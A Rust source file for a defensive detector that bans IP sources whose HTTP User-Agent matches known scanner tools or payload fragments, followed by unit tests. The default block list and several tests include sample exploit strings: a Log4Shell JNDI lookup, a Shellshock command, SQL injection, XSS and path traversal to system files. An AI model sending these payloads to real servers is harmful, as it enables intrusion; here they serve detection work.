use std::net::IpAddr;
use std::time::Duration;


use crate::detector::Detector;
use crate::detectors::netkey::{source_key, DEFAULT_IPV6_PREFIX};
use crate::models::{Action, DetectionSignal, EventType, NormalizedEvent};

/// Default scanner user-agent substrings (case-insensitive matching).
///
/// Tool names, plus exploit payloads that attackers put *into* the
/// User-Agent header (Log4Shell `jndi:`, Shellshock `() {`, traversal to
/// system files, time-based SQLi `sleep(`, reflected XSS `<script`) — none of
/// them occurs in a real browser or crawler UA.
pub fn default_scanner_signatures() -> Vec<String> {
    [
        "nikto",
        "sqlmap",
        "nuclei",
        "nessus",
        "openvas",
        "w3af",
        "skipfish",
        "wpscan",
        "dirbuster",
        "gobuster",
        "masscan",
        "zgrab",
        // 2026-10 production review
        "wp2shell",
        "cve-20",
        "l9scan",
        "l9explore",
        "infrawatch",
        "pbx-scanner",
        "censysinspect",
        "odin-scanner",
        "modatscanner",
        // payloads carried in the UA itself
        "jndi:",
        "/etc/passwd",
        "win.ini",
        "boot.ini",
        "() {",
        "sleep(",
        "<script",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// HTTP scanner fingerprint detector.
///
/// Checks the `user_agent` metadata field against a list of known scanner
/// signatures using case-insensitive substring matching. A single match
/// immediately produces a detection signal.
pub struct ScannerFingerprintDetector {
    /// Signatures as configured (used in the signal reason).
    scanners: Vec<String>,
    /// Lower-cased signatures, same order as `scanners`.
    scanners_lc: Vec<String>,
    ban_duration: Duration,
    /// IPv6 ban prefix (default /64; 0/128 = per address).
    ipv6_prefix: u8,
}

impl ScannerFingerprintDetector {
    pub fn new() -> Self {
        Self::with_config(default_scanner_signatures(), Duration::from_secs(259200)) // 72h
    }

    pub fn with_config(scanners: Vec<String>, ban_duration: Duration) -> Self {
        // Empty signatures would match every UA: drop them.
        let scanners: Vec<String> = scanners.into_iter().filter(|s| !s.trim().is_empty()).collect();
        let scanners_lc = scanners.iter().map(|s| s.to_lowercase()).collect();
        Self {
            scanners,
            scanners_lc,
            ban_duration,
            ipv6_prefix: DEFAULT_IPV6_PREFIX,
        }
    }

    /// Ban IPv6 sources as this prefix (0 or 128 = per address).
    pub fn with_ipv6_prefix(mut self, prefix: u8) -> Self {
        self.ipv6_prefix = prefix;
        self
    }

    fn compute_evidence_hash(ip: &IpAddr, ua: &str) -> [u8; 32] {
        let input = format!("{ip}:scanner_fingerprint:{ua}");
        *blake3::hash(input.as_bytes()).as_bytes()
    }

    /// Check if user_agent matches any known scanner signature (case-insensitive).
    fn matches_scanner(&self, user_agent: &str) -> Option<&str> {
        let ua_lower = user_agent.to_lowercase();
        self.scanners_lc
            .iter()
            .position(|sig| ua_lower.contains(sig.as_str()))
            .map(|i| self.scanners[i].as_str())
    }
}

impl Default for ScannerFingerprintDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for ScannerFingerprintDetector {
    fn name(&self) -> &str {
        "scanner_fingerprint"
    }

    fn process(&self, event: &NormalizedEvent) -> Option<DetectionSignal> {
        match event.event_type {
            EventType::HttpRequest | EventType::Http4xx | EventType::Http5xx => {}
            _ => return None,
        }

        let user_agent = event.metadata.get("user_agent")?;
        let matched = self.matches_scanner(user_agent)?;

        let ip = event.source_ip;
        let reason = format!(
            "Scanner fingerprint: user-agent matches '{}' from {}",
            matched, ip
        );
        let evidence_hash = Self::compute_evidence_hash(&ip, user_agent);

        Some(DetectionSignal {
            source_ip: source_key(ip, self.ipv6_prefix),
            severity: 200,
            confidence: 0.85,
            reason,
            evidence_hash,
            suggested_action: Action::Ban(self.ban_duration),
            detector_name: self.name().to_string(),
            timestamp: event.timestamp,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use std::collections::HashMap;

    fn make_http_event_with_ua(ip: &str, ua: &str, event_type: EventType) -> NormalizedEvent {
        let mut metadata = HashMap::new();
        metadata.insert("path".to_string(), "/test".to_string());
        metadata.insert("method".to_string(), "GET".to_string());
        metadata.insert("user_agent".to_string(), ua.to_string());
        metadata.insert("status_code".to_string(), "200".to_string());
        NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: ip.parse().unwrap(),
            event_type,
            source_name: "nginx".to_string(),
            raw_line: format!("GET /test - {ua}"),
            metadata,
        }
    }

    #[test]
    fn nikto_triggers_ban() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "Mozilla/5.0 (Nikto/2.1.5)",
            EventType::HttpRequest,
        );
        let signal = det.process(&event).expect("should detect Nikto");
        assert_eq!(signal.severity, 200);
        assert_eq!(signal.confidence, 0.85);
        assert_eq!(
            signal.suggested_action,
            Action::Ban(Duration::from_secs(259200))
        );
        assert!(signal.reason.contains("nikto"));
        assert_eq!(signal.detector_name, "scanner_fingerprint");
    }

    #[test]
    fn sqlmap_triggers_ban() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "5.6.7.8",
            "sqlmap/1.6.2#stable",
            EventType::Http4xx,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn nuclei_triggers_ban() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "5.6.7.8",
            "Nuclei - Open-source project",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn wpscan_triggers_ban() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "5.6.7.8",
            "WPScan v3.8.24",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn gobuster_triggers_ban() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "5.6.7.8",
            "gobuster/3.6",
            EventType::Http4xx,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn mozilla_no_trigger() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn chrome_no_trigger() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn case_insensitive_match() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "NIKTO/2.1.5",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_some(), "should match case-insensitively");
    }

    #[test]
    fn mixed_case_match() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "Sqlmap v1.0",
            EventType::HttpRequest,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn auth_failure_event_ignored() {
        let mut det = ScannerFingerprintDetector::new();
        let mut metadata = HashMap::new();
        metadata.insert("user_agent".to_string(), "nikto/2.0".to_string());
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::AuthFailure,
            source_name: "ssh".to_string(),
            raw_line: "test".to_string(),
            metadata,
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn smtp_event_ignored() {
        let mut det = ScannerFingerprintDetector::new();
        let mut metadata = HashMap::new();
        metadata.insert("user_agent".to_string(), "nikto/2.0".to_string());
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::SmtpAuthFailure,
            source_name: "postfix".to_string(),
            raw_line: "test".to_string(),
            metadata,
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn missing_user_agent_no_signal() {
        let mut det = ScannerFingerprintDetector::new();
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::HttpRequest,
            source_name: "nginx".to_string(),
            raw_line: "GET /".to_string(),
            metadata: HashMap::new(),
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn http5xx_also_checked() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "1.2.3.4",
            "nikto/2.1.5",
            EventType::Http5xx,
        );
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn custom_scanner_list() {
        let mut det = ScannerFingerprintDetector::with_config(
            vec!["mybot".into(), "evilcrawler".into()],
            Duration::from_secs(7200),
        );

        let event1 = make_http_event_with_ua("1.2.3.4", "MyBot/1.0", EventType::HttpRequest);
        let signal = det.process(&event1).expect("custom scanner should match");
        assert_eq!(
            signal.suggested_action,
            Action::Ban(Duration::from_secs(7200))
        );

        // Default scanner should NOT match custom list
        let event2 = make_http_event_with_ua("1.2.3.4", "nikto/2.0", EventType::HttpRequest);
        assert!(det.process(&event2).is_none());
    }

    #[test]
    fn ipv6_scanner() {
        let mut det = ScannerFingerprintDetector::new();
        let event = make_http_event_with_ua(
            "2001:db8::dead:beef",
            "sqlmap/1.6",
            EventType::HttpRequest,
        );
        let signal = det.process(&event).expect("IPv6 should trigger");
        assert!(signal.source_ip.addr().to_string().contains("2001:db8"));
    }

    #[test]
    fn multiple_scans_same_ip() {
        let mut det = ScannerFingerprintDetector::new();
        let event1 = make_http_event_with_ua("1.2.3.4", "nikto/2.0", EventType::HttpRequest);
        assert!(det.process(&event1).is_some());

        let event2 = make_http_event_with_ua("1.2.3.4", "sqlmap/1.6", EventType::HttpRequest);
        assert!(det.process(&event2).is_some());
    }

    #[test]
    fn evidence_hash_differs_for_different_uas() {
        let mut det = ScannerFingerprintDetector::new();
        let event1 = make_http_event_with_ua("1.2.3.4", "nikto/2.0", EventType::HttpRequest);
        let s1 = det.process(&event1).unwrap();

        let event2 = make_http_event_with_ua("1.2.3.4", "sqlmap/1.6", EventType::HttpRequest);
        let s2 = det.process(&event2).unwrap();

        assert_ne!(s1.evidence_hash, s2.evidence_hash);
    }

    #[test]
    fn default_constructor() {
        let det = ScannerFingerprintDetector::default();
        assert_eq!(det.name(), "scanner_fingerprint");
        assert_eq!(det.scanners.len(), default_scanner_signatures().len());
        assert!(det.scanners.len() >= 28);
        assert_eq!(det.ban_duration, Duration::from_secs(259200));
    }

    #[test]
    fn all_default_scanners_match() {
        let mut det = ScannerFingerprintDetector::new();
        let scanners = vec![
            "nikto", "sqlmap", "nuclei", "nessus", "openvas", "w3af",
            "skipfish", "wpscan", "dirbuster", "gobuster", "masscan", "zgrab",
        ];
        for scanner in scanners {
            let event = make_http_event_with_ua(
                "1.2.3.4",
                &format!("{scanner}/1.0"),
                EventType::HttpRequest,
            );
            assert!(
                det.process(&event).is_some(),
                "scanner '{}' should trigger",
                scanner
            );
        }
    }

    #[test]
    fn new_signatures_and_payloads_match_case_insensitively() {
        let det = ScannerFingerprintDetector::new();
        for ua in [
            "WP2Shell/1.0",
            "Mozilla/5.0 (CVE-2025-1234 checker)",
            "Mozilla/5.0 (l9scan/2.0.; +https://leakix.net)",
            "l9explore/1.2.2",
            "InfraWatch scanner",
            "PBX-Scanner",
            "Mozilla/5.0 CensysInspect/1.1",
            "odin-scanner/1.0",
            "ModatScanner/1.0",
            "${jndi:ldap://x.example/a}",
            "() { :; }; /bin/bash -c id",
            "Mozilla/5.0' AND SLEEP(5)--",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "C:/boot.ini",
        ] {
            let ev = make_http_event_with_ua("100.64.0.3", ua, EventType::HttpRequest);
            assert!(det.process(&ev).is_some(), "UA {ua:?} must match");
        }
    }

    #[test]
    fn common_browsers_and_crawlers_do_not_match() {
        let det = ScannerFingerprintDetector::new();
        for ua in [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "-",
        ] {
            let ev = make_http_event_with_ua("100.64.0.3", ua, EventType::HttpRequest);
            assert!(det.process(&ev).is_none(), "UA {ua:?} must not match");
        }
    }

    #[test]
    fn empty_signature_is_ignored_and_ipv6_uses_prefix() {
        let det = ScannerFingerprintDetector::with_config(vec!["".into(), "  ".into()], Duration::from_secs(60));
        let ev = make_http_event_with_ua("100.64.0.3", "anything", EventType::HttpRequest);
        assert!(det.process(&ev).is_none());

        let det = ScannerFingerprintDetector::new();
        let ev = make_http_event_with_ua("2001:db8:9:9::1", "sqlmap/1.8", EventType::HttpRequest);
        assert_eq!(det.process(&ev).unwrap().source_ip.to_string(), "2001:db8:9:9::/64");
    }
}
